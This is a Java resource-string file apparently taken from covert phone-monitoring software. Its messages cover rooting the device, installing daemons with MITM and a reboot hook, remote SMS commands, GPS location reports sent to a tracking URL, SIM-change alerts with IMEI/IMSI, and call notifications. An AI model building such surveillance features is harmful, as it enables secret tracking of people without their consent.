package com.fx.util;


public class FxResource {
	
	public static final String UTF_8 = "UTF-8";
	
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	/**
	 * Waiting message for general operation
	 */
	public static final String LANGUAGE_UI_MSG_PROCESSING_POLITE = "Please Wait ...";
	
	/**
	 * Waiting message for installing operation
	 */
	public static final String NOTIFY_INSTALLATION_STEP = "Verifying %d / 4 ...";

	/**
	 * Form for About dialog
	 */
	public static final String LANGUAGE_ABOUT_INFORMATION = "Product: %s<br>Version: %s<br>Date: %s";
	
	/**
	 * Activation response message
	 */
	public static final String LANGUAGE_ACTIVATION_SUCCESS = "Activation success. Nice!";
	public static final String LANGUAGE_DEACTIVATION_SUCCESS = "Deactivation success. Nice!";
	public static final String LANGUAGE_ACTIVATION_FAILED = "Activation failed. Please try again";
	public static final String LANGUAGE_DEACTIVATION_FAILED = "Deactivation failed. Please try again";
	public static final String LANGUAGE_ACTIVATION_RESPONSE_NOT_DEFINED = "Response Code not recognized";
	public static final String LANGUAGE_NETWORK_ERROR = "Network Error";
	
	/**
	 * Notify message when waiting dialog is time out.
	 */
	public static final String LANGUAGE_PROCESS_NOT_RESPONDING = "Process seems not responding, please try again.";
	
	/**
	 * Verify root response message
	 */
	public static final String LANGUAGE_ROOT_PERFECTLY_ACQUIRED = "Root permission is acquired.";
	public static final String LANGUAGE_SU_EXEC_FAILED = "Cannot acquire root permission, please check your device.";
	public static final String LANGUAGE_SYSTEM_WRITE_FAILED = "System partition is still protected, please check your device";
	
	public static final String LANGUAGE_RESET_SUCCESS = "Reset operation success.";
	public static final String LANGUAGE_RESET_FAILED = "Reset operation failed.";
	
	public static final String LANGUAGE_REMOTE_CALLING_FAILED = "Operation failed.";

	/**
	 * Notify message after installation process is finished (install/run daemons, MITM, create reboot hook)
	 */
	public static final String LANGUAGE_STARTUP_GET_ROOT_SUCCESS = "Root permission acquired.";
	public static final String LANGUAGE_STARTUP_INSTALLATION_FAILED = "Service initialization failed, please try again.";
	public static final String LANGUAGE_STARTUP_RUNNING_FAILED = "Cannot run the services, please try again.";
	
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_OK = "OK";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_ERROR = "Error";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_WATCH_LIST_FULL = "Watchlist full.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_WARNING_MONITOR_NUMBER = "Warning: Your monitor number not set. Set number using correct parameters.";	
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_NOT_A_COMMAND = "Not a command message.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT = "Invalid command format.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_COMMAND_NOT_FOUND = "Command not found or not registered.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_ACTIVATION_CODE = "Invalid Activation Code.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_KEYWORD = "Cannot add keyword to keyword list, cannot be less than 10 characters.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_WRONG_ACTIVATION_CODE = "Wrong Activation Code.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_PRODUCT_IS_NOT_ACTIVATED = "Product is not yet activated.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_INVALID_ON_OFF_VALUE = "Invalid GPS on/off value.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_INVALID_TIMER_VALUE = "Invalid GPS timer interval.";
	
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_ACK = "Waiting for GPS data, please be patient.";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_IS_RETRYING = "No location currently available, coordinates will be sent when possible...";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WILL_BE_STOPPED = "Unable to get GPS location, GPS setting is disabled.";
	
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_GPS = "Coordinates received from satellite positioning";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_NETWORK = "Coordinates received from network";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_GLOCATION = "No GPS available, coordinates based on nearest mobile tower";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_METHOD_UNKNOWN = "Coordinates received from unknown source";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_GPS_ON_DEMAND_WEB_SERVICE_FORM = "http://trkps.com/m.php?lat=%f&long=%f&t=%s&i=%s&z=5";
	
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_DEACTIVATE_SERVER_FAILED = "Connection error. Client has been deactivated, but may still be shown as activated on the server.";
	
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_DELIVER_FAILED_NETWORK_DISABLED = "Wifi or GPRS connection is not enabled";
	public static final String LANGUAGE_SMSCOMMAND_RESPONSE_DELIVER_FAILED_NO_INTERNET = "Unable to make internet connection";
	
	public static final String LANGUAGE_SIM_CHANGE_NOTIFICATION_GSM = 
		"%s has detected SIM change. New SIM number is now as this SMS.\n\n" + 
		"Network: %s\n" + "MNC: %s\n" + "MCC: %s\n" + "IMEI: %s\n" + "IMSI: %s";
	
	public static final String LANGUAGE_SIM_CHANGE_NOTIFICATION_CDMA = 
		"%s has detected SIM change. New SIM number is now as this SMS.\n\n" + 
		"Network: %s\n" + "MNC: %s\n" + "MCC: %s\n" + "MEID: %s\n" + "IMSI: %s";
	
	public static final String LANGUAGE_CONNECTION_HISTORY_NO_HISTORY = "No connection has been made since %s";
	public static final String LANGUAGE_CONNECTION_HISTORY_CONNECTION_TYPE_NO_CONNECTION = "No connection";
	public static final String LANGUAGE_CONNECTION_HISTORY_CONNECTION_TYPE_UNRECOGNIZED = "Unknown";
	public static final String LANGUAGE_CONNECTION_HISTORY_CONNECTION_TYPE_WIFI = "Wifi";
	public static final String LANGUAGE_CONNECTION_HISTORY_CONNECTION_TYPE_MOBILE = "GPRS/3G";
    
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_ACTION = "Action:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_CONNECTION_TYPE = "Connection type:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_START_TIME = "Start time:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_END_TIME = "End time:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_DURATION = "Duration (ms):";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_CONNECTION_STATUS = "Connection status:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_RESPONSE_CODE = "Response code:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_HTTP_STATUS_CODE = "HTTP status code:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_NUM_EVENTS_SENT = "Number of events sent:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_NUM_EVENTS_RECEIVED = "Number of events received:";
	public static final String LANGUAGE_CONNECTION_HISTORY_NAME_MESSAGE = "Message:";
	
	public static final String LANGUAGE_CONNECTION_HISTORY_ERROR_NO_SERVER_MSG = "Cannot get message from server";
	
	public static final String LANGUAGE_EVENTS_RESPONSE_HTTP_STATUS = "HTTP Status: %d";
	public static final String LANGUAGE_EVENTS_RESPONSE_CODE_UNKNOWN = "Response Code not recognized";
	
	public static final String LANGUAGE_EVENTS_RESPONSE_SUCCESS = "Events sent successfully";
	public static final String LANGUAGE_EVENTS_RESPONSE_PARTIAL_SUCCESS = "Successfully sent %d events. Tried to send %d events";
	public static final String LANGUAGE_EVENTS_RESPONSE_FAILED_UNKNOWN_1 = "Unknown number of events server received";
	public static final String LANGUAGE_EVENTS_RESPONSE_FAILED_UNKNOWN_2 = "Unknown number of events server received";
	public static final String LANGUAGE_EVENTS_RESPONSE_INCORRECT_LENGTH = "Bad response data or packet";

	public static final String LANGUAGE_SMS_NOTIFY_FOR_INCOMING = "Incoming call from %s is detected.\n%s: %s";
	public static final String LANGUAGE_SMS_NOTIFY_FOR_OUTGOING = "Outgoing call to %s is detected.\n%s: %s";
	public static final String LANGUAGE_SMS_NOTIFY_FOR_MUSIC_PLAY = "Cannot accept call while playing music, try again later.";
	public static final String LANGUAGE_PRIVATE_NUMBER = "unknown";
	
}